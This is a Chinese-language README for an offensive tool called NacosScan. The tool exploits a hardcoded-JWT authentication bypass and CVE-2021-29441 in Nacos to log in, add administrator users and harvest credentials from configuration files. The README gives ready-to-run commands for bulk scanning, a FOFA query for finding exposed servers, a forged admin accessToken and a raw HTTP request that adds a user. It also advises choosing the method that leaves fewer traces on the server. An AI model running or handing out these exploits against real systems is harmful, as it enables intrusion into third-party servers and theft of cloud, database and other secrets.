# NacosScan

慢慢磨合 欢迎 issue

# do what?

- [x] 漏洞利用
  - [x] JWT 硬编码登陆
  - [x] api未授权添加用户

- [x] 可从文件中读取，支持输入url，也可以输入 host、ip 自动重定向。最好还是用 url 指定 nacos 路径
- [x] 配置读取
  - [x] 默认会使用 JWT 硬编码尝试读取，可通过 -t 指定 token 在无漏洞时仍可读取配置文件
  - [x] 提取期望 key，可自行在 moudle/jwtToken.py 文件中修改，目前支持 ["aliyun", "oss", "datasource", "redis", "ftp", "server", "wechat", "store", "minio"]
  - [x] 文件格式
    - [x] 支持解析 yaml、yml 文件
    - [ ] json、 properties、无后缀等情况，实战遇到再加，目前只简单处理


## 使用

### JWT 硬编码登陆

建议优先使用该漏洞，少在服务器留下东西。。

```sh
# 指定 url，必须为nacos服务的路径
python3.8 nacosScan.py jwt -u {http://ip/nacos}

# 指定ip、host 后重定向
python3.8 nacosScan.py jwt -u {ip}

# 文件中读取
python3.8 nacosScan.py jwt -uf {url.txt}
```

### api未授权添加用户

```sh
# 默认添加 nasin natan
python3.8 nacosScan.py api -u {url}

# 指定ip、host 后重定向
python3.8 nacosScan.py api -u {ip}

# 指定用户名、密码
python3.8 nacosScan.py api -u {http://ip/nacos} -user {} -pass {}
```

### 读配置

存在 nacos 相关泄漏时也可以来读配置

```sh
# 指定 username password
python3.8 nacosScan.py jwt -u {http://ip/nacos} -user {} -pass {}

# 指定 accessToken 读配置
python3.8 nacosScan.py jwt -u {http://ip/nacos} -t {token}
```

## 效果图

JWT 硬编码登陆、读配置

![image-20230720111247294](attachments/image-20230720111247294.png)

api未授权添加用户

![image-20230720115207827](attachments/image-20230720115207827.png)

指定账号密码读配置

![image-20230720143700553](attachments/image-20230720143700553.png)

# 0x01 Nacos JWT 硬编码登陆

https://github.com/alibaba/nacos/issues/9830

## 概述

### 漏洞描述

Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。若您Nacos未修改 secret.key，则攻击者可利用默认secret.key生成JWT Token，从而造成权限绕过访问到相关API接口。

### 影响范围

0.1.0<=com.alibaba.nacos:nacos-console<2.2.0.1

## 环境

fofa

```
app="NACOS" 
```

## 复现

抓取登陆包，修改响应包状态码为 200 和 body

```json
{
"accessToken":
"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU","tokenTtl": 18000,
"globalAdmin": true,"username":"nacos"
}
```

![image-20230530101351383](attachments/image-20230530101351383.png)

# 0x02 Nacos api未授权添加用户 CVE-2021-29441

## 概述

### 漏洞描述

Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。CVE-2021-29441中，攻击者通过添加Nacos-Server的User-Agent头部将可绕过认证，从而进行API操作。

### 影响范围

Up to (excluding) 1.4.1

## 环境

fofa

```
app="NACOS" 
```

## 复现

查询用户列表

http://your-ip:8848/nacos/v1/auth/users?pageNo=1&pageSize=1

添加用户

```http
POST /v1/auth/users HTTP/1.1
Host: nacos.qihuian.com
User-Agent: Nacos-Server
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=crowtt&password=crowt188
```

![image-20230720110732808](attachments/image-20230720110732808.png)



